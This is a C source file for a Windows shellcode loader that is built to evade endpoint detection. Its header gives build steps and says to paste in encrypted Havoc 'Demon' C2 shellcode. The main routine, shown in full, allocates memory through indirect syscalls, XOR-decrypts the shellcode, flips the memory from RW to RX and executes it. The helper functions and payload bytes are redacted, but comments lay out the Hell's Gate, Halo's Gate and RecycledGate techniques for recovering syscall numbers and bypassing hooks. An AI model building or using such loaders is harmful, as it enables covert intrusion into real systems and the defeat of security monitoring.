/*
============================================================
    RECYCLEDGATE INDIRECT SYSCALL LOADER — v1
============================================================

    technique stack:
    - XOR encrypted shellcode at rest
    - RW -> RX memory pattern (no RWX)
    - Indirect syscalls via RecycledGate

    references:
    github.com/thefLink/RecycledGate   — indirect syscalls
    github.com/am0nsec/HellsGate       — SSN resolution
    redops.at/en/blog/direct-syscalls-vs-indirect-syscalls

    build:
    nasm -f win64 syscall.asm -o syscall.o
    x86_64-w64-mingw32-gcc loader.c syscall.o -o loader.exe -lntdll

    shellcode:
    generate Demon shellcode from Havoc
    encrypt with tools/encrypt_shellcode.py
    paste xor_key[] and shellcode[] before compiling
============================================================
*/

#include <stdio.h>
#include <string.h>

/* ============================================================
   WINDOWS TYPES
   ============================================================ */
typedef unsigned char      BYTE;
typedef unsigned short     WORD;
typedef unsigned int       DWORD;
typedef unsigned long      ULONG;
typedef unsigned long long ULONGLONG;
typedef unsigned long long SIZE_T;
typedef void*              PVOID;
typedef int                BOOL;
typedef long               NTSTATUS;
typedef void*              HANDLE;

#define NT_SUCCESS(x)     ((x) >= 0)
#define MEM_COMMIT        0x00001000
#define MEM_RESERVE       0x00002000
#define MEM_RELEASE       0x00008000
#define PAGE_READWRITE    0x04
#define PAGE_EXECUTE_READ 0x20

/* ============================================================
   SYSCALL STRUCT — SSN + gate address per function
   ============================================================ */
typedef struct { PVOID pRecycledGate; DWORD dwSyscallNr; } Syscall;

/* ============================================================
   PE STRUCTS — for EAT walk and PEB traversal
   ============================================================ */
typedef struct { WORD e_magic; BYTE e_padding[58]; DWORD e_lfanew; } IMAGE_DOS_HEADER;
typedef struct { WORD Machine; WORD NumberOfSections; DWORD TimeDateStamp;
    DWORD PointerToSymbolTable; DWORD NumberOfSymbols;
    WORD SizeOfOptionalHeader; WORD Characteristics; } IMAGE_FILE_HEADER;
typedef struct { DWORD VirtualAddress; DWORD Size; } IMAGE_DATA_DIRECTORY;
typedef struct {
    WORD Magic; BYTE MajorLinkerVersion; BYTE MinorLinkerVersion;
    DWORD SizeOfCode; DWORD SizeOfInitializedData; DWORD SizeOfUninitializedData;
    DWORD AddressOfEntryPoint; DWORD BaseOfCode; ULONGLONG ImageBase;
    DWORD SectionAlignment; DWORD FileAlignment;
    WORD MajorOSVersion; WORD MinorOSVersion;
    WORD MajorImageVersion; WORD MinorImageVersion;
    WORD MajorSubsystemVersion; WORD MinorSubsystemVersion;
    DWORD Win32VersionValue; DWORD SizeOfImage; DWORD SizeOfHeaders;
    DWORD CheckSum; WORD Subsystem; WORD DllCharacteristics;
    ULONGLONG SizeOfStackReserve; ULONGLONG SizeOfStackCommit;
    ULONGLONG SizeOfHeapReserve; ULONGLONG SizeOfHeapCommit;
    DWORD LoaderFlags; DWORD NumberOfRvaAndSizes;
    IMAGE_DATA_DIRECTORY DataDirectory[16];
} IMAGE_OPTIONAL_HEADER64;
typedef struct {
    DWORD Signature;
    IMAGE_FILE_HEADER FileHeader;
    IMAGE_OPTIONAL_HEADER64 OptionalHeader;
} IMAGE_NT_HEADERS64;
typedef struct {
    DWORD Characteristics; DWORD TimeDateStamp;
    WORD MajorVersion; WORD MinorVersion;
    DWORD Name; DWORD Base;
    DWORD NumberOfFunctions; DWORD NumberOfNames;
    DWORD AddressOfFunctions; DWORD AddressOfNames; DWORD AddressOfNameOrdinals;
} IMAGE_EXPORT_DIRECTORY;

/* ============================================================
   ASM STUBS — live in syscall.asm
   ============================================================ */
extern void     PrepareSyscall(DWORD ssn, PVOID gate);
extern NTSTATUS DoSyscall(...);

/* ============================================================
   get_ntdll_base — PEB walk to locate ntdll
   reference: Windows Internals, public NT documentation
   ============================================================ */
BYTE *get_ntdll_base(void) {
    /* REDACTED
       GS:0x60 → PEB → PEB_LDR_DATA → InLoadOrderModuleList
       second entry is always ntdll on Windows x64
       reference: Windows Internals 7th ed. */
    return NULL;
}

/* ============================================================
   get_syscall — RecycledGate SSN resolution
   reference: github.com/thefLink/RecycledGate
   ============================================================ */
Syscall get_syscall(char *func_name) {
    /* REDACTED
       walks ntdll EAT to locate target Nt function stub
       Hell's Gate:  func[0]==0x4C → read SSN from func+4
       Halo's Gate:  func[0]==0xE9 → stub hooked, recover SSN from neighbour stubs
       RecycledGate: scan stub for 0x0F 0x05 0xC3 (syscall;ret) — use as gate
       executing syscall from ntdll .text defeats RIP-based EDR detection
       reference: github.com/thefLink/RecycledGate */
    Syscall r = {0};
    return r;
}

/* ============================================================
   MAIN
   ============================================================ */
int main(void) {

    /* SSN resolution via RecycledGate
       reference: github.com/thefLink/RecycledGate */
    Syscall sysAlloc   = get_syscall("NtAllocateVirtualMemory");
    Syscall sysProtect = get_syscall("NtProtectVirtualMemory");
    Syscall sysFree    = get_syscall("NtFreeVirtualMemory");

    /* shellcode — pre-encrypted at build time via tools/encrypt_shellcode.py */
    unsigned char xor_key[]   = { /* REDACTED */ };
    unsigned char shellcode[] = { /* REDACTED */ };
    SIZE_T len = sizeof(shellcode);
    ULONG  old_protect;

    /* allocate RW via NtAllocateVirtualMemory — indirect syscall */
    PVOID  buf  = NULL;
    SIZE_T size = len;
    PrepareSyscall(sysAlloc.dwSyscallNr, sysAlloc.pRecycledGate);
    NTSTATUS status = DoSyscall(
        (HANDLE)-1, &buf, 0, &size,
        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!NT_SUCCESS(status)) return 1;

    /* copy + XOR decrypt in one pass — plaintext never in binary */
    BYTE *bytes = (BYTE *)buf;
    int j;
    for (j = 0; j < len; j++)
        bytes[j] = shellcode[j] ^ xor_key[j % 16];

    /* RW→RX via NtProtectVirtualMemory — indirect syscall, no RWX */
    PVOID  protect_addr = buf;
    SIZE_T protect_size = len;
    PrepareSyscall(sysProtect.dwSyscallNr, sysProtect.pRecycledGate);
    status = DoSyscall(
        (HANDLE)-1, &protect_addr, &protect_size,
        PAGE_EXECUTE_READ, &old_protect);
    if (!NT_SUCCESS(status)) return 1;

    /* execute */
    void (*exec)() = (void(*)())bytes;
    exec();

    /* free via NtFreeVirtualMemory — indirect syscall */
    PVOID  free_addr = buf;
    SIZE_T free_size = 0;
    PrepareSyscall(sysFree.dwSyscallNr, sysFree.pRecycledGate);
    DoSyscall((HANDLE)-1, &free_addr, &free_size, MEM_RELEASE);
    return 0;
}